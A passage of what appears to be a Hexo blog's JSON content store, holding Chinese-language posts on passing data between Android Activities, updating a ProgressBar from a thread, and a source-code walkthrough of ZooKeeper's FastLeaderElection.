id=\"来个实例吧\"><a href=\"#来个实例吧\" class=\"headerlink\" title=\"来个实例吧\"></a>来个实例吧</h3><p><strong>这是第一个Activity代码</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.content.DialogInterface;</span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.EditText;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button) findViewById(R.id.button);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View v)&#123;</span><br><span class=\"line\">            Intent intent = new Intent();</span><br><span class=\"line\">            intent.setClass(MainActivity.this,Main2Activity.class);</span><br><span class=\"line\">            EditText editText = (EditText)findViewById(R.id.editText);</span><br><span class=\"line\">            String name = editText.getText().toString();</span><br><span class=\"line\">            intent.putExtra(<span class=\"string\">\"com.example.administrator.activitytest.Name\"</span>,name);</span><br><span class=\"line\">            startActivity(intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"这是第二个Activity代码\"><a href=\"#这是第二个Activity代码\" class=\"headerlink\" title=\"这是第二个Activity代码\"></a>这是第二个Activity代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main2Activity extends MainActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private TextView textView;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main2);</span><br><span class=\"line\"></span><br><span class=\"line\">        Intent intent = getIntent();</span><br><span class=\"line\">        String name = intent.getStringExtra(<span class=\"string\">\"com.example.administrator.activitytest.Name\"</span>);</span><br><span class=\"line\">        textView = (TextView)findViewById(R.id.textView);</span><br><span class=\"line\">        textView.setText(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"android中ProgressBar和线程学习记录","date":"2016-06-17T08:18:23.000Z","_content":"\n**感觉没什么说的，就直接放代码吧**\n\n### 代码如下\n\n<!--more-->\n\n```\npackage com.example.administrator.prograssbarandthread;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.ProgressBar;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private ProgressBar progressBar;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.Button);\n        progressBar = (ProgressBar)findViewById(R.id.ProgressBar);\n        button.setOnClickListener(new ButtonListener());\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View view){\n            MyThread thread = new MyThread();\n            thread.start();\n        }\n    }\n\n    class MyThread extends Thread{\n        @Override\n        public void run(){\n            for (int i=0;i<=100;i++){\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                progressBar.setProgress(progressBar.getProgress() + 1);\n            }\n        }\n    }\n}\n\n```\n\n**不过关于ProgressBar的具体使用在下面地址里有**\nhttps://developer.android.com/reference/android/widget/ProgressBar.html","source":"_posts/android-ProgressBarAndThread.md","raw":"---\ntitle: android中ProgressBar和线程学习记录\ndate: 2016-06-17 16:18:23\ncategories: Android\ntags:\n  - Android\n  - ProgressBar\n  - 线程\n---\n\n**感觉没什么说的，就直接放代码吧**\n\n### 代码如下\n\n<!--more-->\n\n```\npackage com.example.administrator.prograssbarandthread;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.ProgressBar;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private ProgressBar progressBar;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.Button);\n        progressBar = (ProgressBar)findViewById(R.id.ProgressBar);\n        button.setOnClickListener(new ButtonListener());\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View view){\n            MyThread thread = new MyThread();\n            thread.start();\n        }\n    }\n\n    class MyThread extends Thread{\n        @Override\n        public void run(){\n            for (int i=0;i<=100;i++){\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                progressBar.setProgress(progressBar.getProgress() + 1);\n            }\n        }\n    }\n}\n\n```\n\n**不过关于ProgressBar的具体使用在下面地址里有**\nhttps://developer.android.com/reference/android/widget/ProgressBar.html","slug":"android-ProgressBarAndThread","published":1,"updated":"2017-11-28T03:17:39.717Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxx0010yp0l9fi4yxpy","content":"<p><strong>感觉没什么说的，就直接放代码吧</strong></p>\n<h3 id=\"代码如下\"><a href=\"#代码如下\" class=\"headerlink\" title=\"代码如下\"></a>代码如下</h3><a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.prograssbarandthread;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.ProgressBar;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private ProgressBar progressBar;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.Button);</span><br><span class=\"line\">        progressBar = (ProgressBar)findViewById(R.id.ProgressBar);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View view)&#123;</span><br><span class=\"line\">            MyThread thread = new MyThread();</span><br><span class=\"line\">            thread.start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyThread extends Thread&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run()&#123;</span><br><span class=\"line\">            for (int i=0;i&lt;=100;i++)&#123;</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    Thread.sleep(100);</span><br><span class=\"line\">                &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                progressBar.setProgress(progressBar.getProgress() + 1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>不过关于ProgressBar的具体使用在下面地址里有</strong><br><a href=\"https://developer.android.com/reference/android/widget/ProgressBar.html\" target=\"_blank\" rel=\"external\">https://developer.android.com/reference/android/widget/ProgressBar.html</a></p>\n","excerpt":"<p><strong>感觉没什么说的，就直接放代码吧</strong></p>\n<h3 id=\"代码如下\"><a href=\"#代码如下\" class=\"headerlink\" title=\"代码如下\"></a>代码如下</h3>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.prograssbarandthread;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.ProgressBar;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private ProgressBar progressBar;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.Button);</span><br><span class=\"line\">        progressBar = (ProgressBar)findViewById(R.id.ProgressBar);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View view)&#123;</span><br><span class=\"line\">            MyThread thread = new MyThread();</span><br><span class=\"line\">            thread.start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyThread extends Thread&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run()&#123;</span><br><span class=\"line\">            for (int i=0;i&lt;=100;i++)&#123;</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    Thread.sleep(100);</span><br><span class=\"line\">                &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                progressBar.setProgress(progressBar.getProgress() + 1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>不过关于ProgressBar的具体使用在下面地址里有</strong><br><a href=\"https://developer.android.com/reference/android/widget/ProgressBar.html\">https://developer.android.com/reference/android/widget/ProgressBar.html</a></p>"},{"title":"Zookeeper Leader选举源码解析","date":"2018-04-19T12:49:54.212Z","_content":"\n## Zookeeper简介\nZookeeper 是Apache Hadoop开源项目中的子项目，提供了一个分布式的协调服务框架。Zookeeper暴露了一组简单的操作原语(Primitive)集合，分布式应用能够基于这些原语实现更加高层的服务，包括同步机制、配置管理、服务器集群管理和统一命名服务等。\n\n作为一个分布式的服务框架，Zookeeper主要解决分布式集群中应用系统的一致性问题，它采用类似文件系统目录的节点树的结构作为数据存储模型，并对已存储数据的状态变化进行维护和监控，通过监控这些数据状态的变化实现基于数据的集群管理。\n\nZookeeper 采用服务器集群的方式提供基本服务，服务器集群成为组，组中的成员具有两种角色，即一个唯一的领导者和若干个成员服务器，组能够为多个客户端提供服务。\n\n<!--more-->\n## Zookeeper角色\nZookeeper中的角色主要有以下几种\n\n| 角色 | 角色说明 |\n|--------|--------|\n| 领导者(Leader) | Leader不接受客户端的请求，负责进行投票的发起和决议，最终更新状态      |\n| 学习者(Learner)-跟随着(Follower) | Follower用于接收客户请求并向客户端返回结果，在选举过程中参与投票 |\n| 学习者(Learner)-观察者(Obserber) | Observer可以接收客户端连接，将写请求转发给Leader节点。但它不参与投票过程，只同步Leader的状态。Observer的目的是为了扩展系统，提高读取速度 |\n| 客户端(Client) | 请求发起方 |\n\n## Zookeeper 工作原理\nZookeeper服务有两种不同的运行模式。一种是“独立模式”，即只有一个Zookeeper服务器。这种模式较为简单，比较适合测试环境，但不能保证高可用性和恢复性。在实际应用中，Zookeeper通常以“复制模式”运行在一个计算机集群上。Zookeeper通过复制来实现高可用性，只要集群中半数以上的机器处于可用状态，它就能提供服务。也就是说，在一个有2n+1节点的集群中，任意n台机器出现故障，都可以保证服务继续，因为剩下的n+1台超过了半数。出于这个原因，一个集群通常包含奇数台机器。\n\n从概念上说，Zookeeper非常简单：它所做的就是确保对znode树的每一个修改都会被复制到集群中超过半数的机器上。如果少于半数的机器出现故障，则最少有一台机器会保存最新状态。其余的副本最终也会更新到这个状态。为了实现这个想法，Zookeeper使用了Azb协议。Zab协议包含两个可以无限重复的阶段：\n\n`阶段一`: 当服务启动或者Leader崩溃后，Zab就进入了阶段1。当Leader被选举出来，且超过半数(或指定数量)的Learner完成了和Leader的状态同步以后，阶段1就结束了。状态同步保持了Leader和其他服务器具有相同的系统状态。\n`阶段二`: 原子广播\n所有的写请求都被转发给Leader，再有Leader将更新广播给Learner。当半数以上的Follower已经将修改持久化以后，Leader才会提交这个更新，然后客户端才会收到一个更新成功的响应。这个用来达成共识的协议被设计成具有原子性，因此每个修改要么成功，要么失败。\n\n## Zookeeper Leader选举源码\nZookeeper 中QuorumPeer类出于源码“中心”位置，它与多个类关联，负责管理quorum协议。QuorumPeer继承自Thread，是集群环境下Zookeeper服务器的主线程类。它有4种状态： LOOKING、FOLLOWING、LEADING和OBSERVING，由成员state标识:\n``` java\n// src/java/main/org/apache/zookeeper/server/quorum/QuorumPeer.java\npublic enum ServerState {\n        LOOKING, FOLLOWING, LEADING, OBSERVING;\n    }\n```\n\n这4中状态决定了QuorumPeer的行为，即在集群中充当什么角色。state的初始状态是LOOKING，意思是寻找Leader服务器。一旦选举出Leader，QuorumPeer就切换自身状态，修改state的值，同时实例化对应的服务器控制类。服务器控制类有3种，Leader、Follower和Observer，它们作为QuorumPeer成员对象存在。\n\n> 前面废话了这么多现在正式进入正题。。。。。。\n\nQuorumPeer类有一个属性成员electionAlg，它是Election接口类型。服务器启动时，根据配置信息决定Election的具有实现类，指定选举算法。Election共有两个抽象方法\n``` java\npublic interface Election {\n    public Vote lookForLeader() throws InterruptedException;\n    public void shutdown();\n}\n```\n其中lookForLeader()是核心方法，返回一个Vote类型对象，标识被推荐服务器。Election的实现类有`LeaderEletcion`、`FastLeaderElection`、`AuthFastLeaderElection`。它们之间的区别在于通信机制以及lookForLeader的算法实现。由于源码中已经表示`LeaderElection`和`AuthFastLeaderElection`已经在3.4.0版本被弃用，因此在这里主要看`FastLeaderElection`。\n\n`FastLeaderElection`有3个内部线程类: Listener、SendWorker、RecvWorker。Listener线程新建ServerSocketChannel，监听选举端口，一旦接收到连接请求，调用receiveConnection方法，启动发送线程SendWorker和接收线程RecvWorker。\n\n`LookForLeader`详细源码\n``` java\nsynchronized(this){\n    logicalclock++;\n    updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());\n}\n\nsendNotifications();\n```\n原子性操作，Leader选举开始每个节点投自己一票，其中`getInitId()`、`getInitLastLoggedZxid()`、`getPeerEpoch()`表示当前self节点的状态，然后将投票结果send给其他节点。接下来就循环交换投票信息，直到找到Leader节点。\n``` java\nwhile ((self.getPeerState() == ServerState.LOOKING) && (!stop)) {\n    /*\n     * 从投票消息队列中接收一条消息\n     */\n    Notification n = recvqueue.poll(notTimeout,\n              TimeUnit.MILLISECONDS);\n    if (n == null) {...}\n    /*\n     * 检查n节点是不是参与投票的节点，只有PeerType=PARTICIPANT的节点消息才会参与投票\n     * Observers are not contained in this view, only nodes with\n     * PeerType=PARTICIPANT.\n     */\n    else if(self.getVotingView().containsKey(n.sid)) {\n        switch (n.state) {\n            case LOOKING: 跟自己的投票比较。\n            case OBSERVING: 没有操作\n            case FOLLOWING:\n            case LEADING: 当已经收到LEADING和FOLLOWING表示已经票选出Leader，然后投最后一票给Leader，结束投票\n            default: 没有操作\n    }\n}\n```\n分别看`LOOKING`和`FOLLOWING`、`LEADING`干了什么\n`LOOKING`在干的事情\n``` java\n/*\n * 表示投票轮次大于本节点记录的轮次，表示自己已经落后投票了，将自己的\n * 投票轮次设置为最新的，清空自己的票箱，这个票箱记录了集群中其他节点\n * 的投票结果\n */\nif (n.electionEpoch > logicalclock) {\n    logicalclock = n.electionEpoch;\n    recvset.clear();\n    /*\n     * 将n节点的投票结果与自己的投票结果比较,如果投票比自己的投票合理，\n     * 更新自己的投票，否则还是投自己\n     */\n    if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n    　　　　getInitId(), getInitLastLoggedZxid(), getPeerEpoch())) {\n        updateProposal(n.leader, n.zxid, n.peerEpoch);\n    } else {\n    \tupdateProposal(getInitId(),\n        \tgetInitLastLoggedZxid(),\n        \tgetPeerEpoch());\n    }\n    // 发送自己的投票结果\n    sendNotifications();\n} else if (n.electionEpoch < logicalclock) {\n    // 投票轮次比自己记录的轮次小，说明这个投票已经过时，不处理\n    break;\n} else if (totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n          proposedLeader, proposedZxid, proposedEpoch)) {\n    // 如果是一个轮次，将n节点的投票与自己比较，如果投票更合理，更新投票\n    updateProposal(n.leader, n.zxid, n.peerEpoch);\n    sendNotifications();\n}\n// 将n节点的投票记录下来\nrecvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));\n\n/*\n * 在自己的票箱中查看自己投票的节点是否已经被集群中一半以上的\n * 节点认可了，如果已经有一半以上的节点认可，则结束选举\n */\nif (termPredicate(recvset,\n         new Vote(proposedLeader, proposedZxid,\n         logicalclock, proposedEpoch))) {\n\n    // Verify if there is any change in the proposed leader\n    // 这里没太理解，\n    while((n = recvqueue.poll(finalizeWait,\n            TimeUnit.MILLISECONDS)) != null){\n        if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n                 proposedLeader, proposedZxid, proposedEpoch)){\n            recvqueue.put(n);\n            break;\n        }\n    }\n\n    /*\n     * This predicate is true once we don't read any new\n     * relevant message from the reception queue\n     */\n    if (n == null) {\n        self.setPeerState((proposedLeader == self.getId()) ?\n            ServerState.LEADING: learningState());\n\n        Vote endVote = new Vote(proposedLeader,\n            proposedZxid,\n            logicalclock,\n            proposedEpoch);\n        leaveInstance(endVote);\n        return endVote;\n    }\n}\n```\n其中没有说清楚接收的投票如何和自己的投票比较的，也就是`totalOrderPredicate`方法的实现\n``` java\nprotected boolean totalOrderPredicate(long newId, long newZxid, long newEpoch, long curId, long curZxid, long curEpoch) {\n    if(self.getQuorumVerifier().getWeight(newId) == 0){\n        return false;\n    }\n\n    /*\n     * We return true if one of the following three cases hold:\n     * 1- New epoch is higher\n     * 2- New epoch is the same as current epoch, but new zxid is higher\n     * 3- New epoch is the same as current epoch, new zxid is the same\n     *  as current zxid, but server id is higher.\n     */\n\n    return ((newEpoch > curEpoch) ||\n            ((newEpoch == curEpoch) &&\n            ((newZxid > curZxid) || ((newZxid == curZxid) && (newId > curId)))));\n}\n```\n可以看出，比较的顺序是Epoch、zxid、Id，优先选投票轮次高的，投票轮次相同选Zxid高的，Zxid相同选id高的，因此在Zookeeper启动的时候，往往id高的获得Leader，但不绝对，比如在5个节点的集群中，启动顺序分别是1->2->3->4->5，当票选到节点3时已经票选超过半数，那么后面启动的4和5就直接成为follower\n\n接下来再分析`FOLLOWING`和`LEADING`\n``` java\nif(n.electionEpoch == logicalclock){\n    recvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));\n    // 如果推举的Leader是自己，把自己的状态改为LEADING\n    if(ooePredicate(recvset, outofelection, n)) {\n        self.setPeerState((n.leader == self.getId()) ?\n        ServerState.LEADING: learningState());\n    Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);\n    leaveInstance(endVote);\n    return endVote;\n}\n/*\n * 确定Leader之前要保证半数以上的节点已经成为follower\n * Before joining an established ensemble, verify\n * a majority is following the same leader.\n */\noutofelection.put(n.sid, new Vote(n.version,\n        n.leader,\n        n.zxid,\n        n.electionEpoch,\n        n.peerEpoch,\n        n.state));\n\nif(ooePredicate(outofelection, outofelection, n)) {\n        synchronized(this){\n            logicalclock = n.electionEpoch;\n            self.setPeerState((n.leader == self.getId()) ?\n                ServerState.LEADING: learningState());\n            }\n        Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);\n        leaveInstance(endVote);\n        return endVote;\n}\n```\n\n这里需要解释一下`ooePredicate`\n``` java\n/**\n * This predicate checks that a leader has been elected. It doesn't\n * make a lot of sense without context (check lookForLeader) and it\n * has been separated for testing purposes.\n * 有两个map，一个表示收到的投票集合，一个表示LEADING状态节点和FOLLOWING节点的投票\n * 集合，这里要确定两个条件：一个是在收到的LOOKING节点中半数认为n节点应该是Leader\n * 另一个是LEADING节点必须告诉其他节点自己是LEADING状态，避免一直投票\n *\n * @param recv  map of received votes\n * @param ooe   map containing out of election votes (LEADING or FOLLOWING)\n * @param n     Notification\n * @return\n */\nprotected boolean ooePredicate(HashMap<Long,Vote> recv,\n                                HashMap<Long,Vote> ooe,\n                                Notification n) {\n\n    return (termPredicate(recv, new Vote(n.version,\n                                         n.leader,\n                                         n.zxid,\n                                         n.electionEpoch,\n                                         n.peerEpoch,\n                                         n.state))\n            && checkLeader(ooe, n.leader, n.electionEpoch));\n\n}\n```\n再来看一下`checkLeader`\n``` java\n\t/**\n     * In the case there is a leader elected, and a quorum supporting\n     * this leader, we have to check if the leader has voted and acked\n     * that it is leading. We need this check to avoid that peers keep\n     * electing over and over a peer that has crashed and it is no\n     * longer leading.\n     *\n     * @param votes set of votes\n     * @param   leader  leader id\n     * @param   electionEpoch   epoch id\n     */\n    protected boolean checkLeader(\n            HashMap<Long, Vote> votes,\n            long leader,\n            long electionEpoch){\n\n        boolean predicate = true;\n\n        /*\n         * If everyone else thinks I'm the leader, I must be the leader.\n         * The other two checks are just for the case in which I'm not the\n         * leader. If I'm not the leader and I haven't received a message\n         * from leader stating that it is leading, then predicate is false.\n         */\n\n        if(leader != self.getId()){\n            if(votes.get(leader) == null) predicate = false;\n            else if(votes.get(leader).getState() != ServerState.LEADING) predicate = false;\n        } else if(logicalclock != electionEpoch) {\n            predicate = false;\n        }\n\n        return predicate;\n    }\n```\n\n`FastLeaderElection`源码分析完了，总结一下：首先，每个节点先给自己投票，然后将投票信息发送给集群中的其他节点；每个节点收到其他节点的投票，放在**投票队列**中，从队列中提取投票，跟自己的投票比较，如果投票更合理，就替换自己的投票，否则不改变自己的投票。然后检测自己当前的投票是否相同于集群半数以上的节点，如果相同于半数以上投票，则判断这个投票是不是投的自己，如果是投的自己，则改变自己的状态为LEADING，否则改为FOLLOWING或者OBSERVER，最后返回最后的投票，并结束`LookForLeader`。","source":"_posts/ZookeeperLeaderElection.md","raw":"---\ntitle: Zookeeper Leader选举源码解析\ndate: 2018-04-1８ 15:18:23\ncategories: 分布式计算\ntags:\n  - Zookeeper\n  - FastLeaderElection\n---\n\n## Zookeeper简介\nZookeeper 是Apache Hadoop开源项目中的子项目，提供了一个分布式的协调服务框架。Zookeeper暴露了一组简单的操作原语(Primitive)集合，分布式应用能够基于这些原语实现更加高层的服务，包括同步机制、配置管理、服务器集群管理和统一命名服务等。\n\n作为一个分布式的服务框架，Zookeeper主要解决分布式集群中应用系统的一致性问题，它采用类似文件系统目录的节点树的结构作为数据存储模型，并对已存储数据的状态变化进行维护和监控，通过监控这些数据状态的变化实现基于数据的集群管理。\n\nZookeeper 采用服务器集群的方式提供基本服务，服务器集群成为组，组中的成员具有两种角色，即一个唯一的领导者和若干个成员服务器，组能够为多个客户端提供服务。\n\n<!--more-->\n## Zookeeper角色\nZookeeper中的角色主要有以下几种\n\n| 角色 | 角色说明 |\n|--------|--------|\n| 领导者(Leader) | Leader不接受客户端的请求，负责进行投票的发起和决议，最终更新状态      |\n| 学习者(Learner)-跟随着(Follower) | Follower用于接收客户请求并向客户端返回结果，在选举过程中参与投票 |\n| 学习者(Learner)-观察者(Obserber) | Observer可以接收客户端连接，将写请求转发给Leader节点。但它不参与投票过程，只同步Leader的状态。Observer的目的是为了扩展系统，提高读取速度 |\n| 客户端(Client) | 请求发起方 |\n\n## Zookeeper 